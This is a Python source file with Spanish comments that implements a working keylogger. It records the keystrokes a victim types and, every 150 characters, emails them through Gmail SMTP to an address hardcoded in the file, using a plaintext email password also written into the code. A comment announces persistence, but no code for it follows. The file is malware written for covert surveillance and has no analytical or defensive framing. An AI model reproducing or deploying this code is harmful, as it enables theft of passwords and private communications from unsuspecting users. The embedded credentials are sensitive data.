import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import shutil
import subprocess
import sys

# Configuración de correo electrónico
correo_remitente = 'fatherplace2010@gmail.com'
contrasena_remitente = 'uzhu laos qyyg zuid'
correo_destinatario = 'fatherplace2010@gmail.com'
asunto = 'Results'

#Habilitar Persistencia

# Variable global para almacenar las palabras
palabras_ingresadas = ""

# Función para enviar correo electrónico
def enviar_correo(contenido):
    mensaje = MIMEMultipart()
    mensaje['From'] = correo_remitente
    mensaje['To'] = correo_destinatario
    mensaje['Subject'] = asunto

    cuerpo_mensaje = f'Informacion escrita por la victima:\n\n{contenido}'

    mensaje.attach(MIMEText(cuerpo_mensaje, 'plain'))

    with smtplib.SMTP('smtp.gmail.com', 587) as servidor_smtp:
        servidor_smtp.starttls()
        servidor_smtp.login(correo_remitente, contrasena_remitente)
        servidor_smtp.sendmail(correo_remitente, correo_destinatario, mensaje.as_string())

# Función para manejar las teclas presionadas
def pressedkeys(key):
    global palabras_ingresadas

    if key.name == 'space':
        palabras_ingresadas += ' '
    elif key.name == 'backspace':
        # No registrar la palabra "backspace"
        pass
    elif key.event_type == keyboard.KEY_DOWN:
        # Verificar si la tecla es una tecla de modificación (Shift, Mayúsculas, etc.)
        if key.name not in ['shift', 'right shift', 'left shift', 'caps lock', 'enter','ctrl','alt']:
            # Escribir solo si no es una tecla de modificación
            if not keyboard.is_pressed('caps lock'):
                # Escribir solo si el bloqueo de mayúsculas no está activado
                palabras_ingresadas += key.name

                # Verificar si se ha alcanzado la longitud de 150 caracteres
                if len(palabras_ingresadas) >= 150:
                    # Enviar correo electrónico y reiniciar el conteo
                    enviar_correo(palabras_ingresadas)
                    palabras_ingresadas = ''  # Reiniciar la variable

# Configurar la función de manejo de teclas
keyboard.on_press(pressedkeys)

# Esperar eventos de teclado
keyboard.wait()